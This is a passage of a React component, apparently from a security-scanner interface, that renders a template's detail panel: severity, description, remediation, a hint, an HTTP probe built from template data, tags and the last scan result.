                        <button className="tmpl-action-btn send small" onClick={() => sendToFindings(t, r)} title="Send to Findings">
                          <Send size={10} />
                        </button>
                      )}
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        )}
      </div>

      {/* ── Detail Panel ─── */}
      {selected && (
        <div className="template-detail">
          <div className="template-detail-header">
            <span className="template-card-severity" data-sev={selected.severity}>{selected.severity}</span>
            <div className="template-detail-title">{selected.name}</div>
            <button
              onClick={() => setSelected(null)}
              style={{ marginLeft: 'auto', background: 'none', border: 'none', color: 'var(--text-3)', cursor: 'pointer', fontSize: 16 }}
            >×</button>
          </div>

          <div className="template-detail-section">
            <h4>Description</h4>
            <p>{selected.description}</p>
          </div>

          {selected.remediation && (
            <div className="template-detail-section">
              <h4>Remediation</h4>
              <p>{selected.remediation}</p>
            </div>
          )}

          {selected.hint && (
            <div className="template-detail-section">
              <h4>Manual Hint</h4>
              <p>{selected.hint}</p>
            </div>
          )}

          {selected.probe && (
            <div className="template-detail-section">
              <h4>Probe</h4>
              <pre>{`${(selected.probe.method || 'GET')} ${joinUrl(target || 'https://target.example', selected.probe.path)}${selected.probe.headers ? '\n' + Object.entries(selected.probe.headers).map(([k,v]) => `${k}: ${v}`).join('\n') : ''}${selected.probe.body ? '\n\n' + selected.probe.body : ''}

expect:
${JSON.stringify(selected.probe.expect, null, 2)}`}</pre>
            </div>
          )}

          <div className="template-detail-section">
            <h4>Template ID</h4>
            <pre>{selected.id}</pre>
          </div>

          <div className="template-detail-section">
            <h4>Tags</h4>
            <div className="template-detail-tags">
              {selected.tags.map(tag => (
                <span key={tag} className="template-card-tag">{tag}</span>
              ))}
            </div>
          </div>

          {results[selected.id] && (
            <div className="template-detail-section">
              <h4>Last Result {results[selected.id].finished_at ? `(${new Date(results[selected.id].finished_at!).toLocaleTimeString()})` : ''}</h4>
              <p style={{ marginBottom: 6 }}><ResultBadge r={results[selected.id]} /></p>
              {results[selected.id].reason && (
                <p style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: 'var(--text-2)' }}>{results[selected.id].reason}</p>
              )}
              {results[selected.id].error && (
                <p style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: 'var(--red)' }}>{results[selected.id].error}</p>
              )}
              {results[selected.id].resp && (
                <pre style={{ maxHeight: 200 }}>{`HTTP/1.1 ${results[selected.id].resp!.status}
${results[selected.id].resp!.headers}

${results[selected.id].resp!.body.slice(0, 1200)}${results[selected.id].resp!.body.length > 1200 ? '\n…[truncated]' : ''}`}</pre>
              )}
            </div>
          )}
        </div>
      )}
    </div>
  );
}
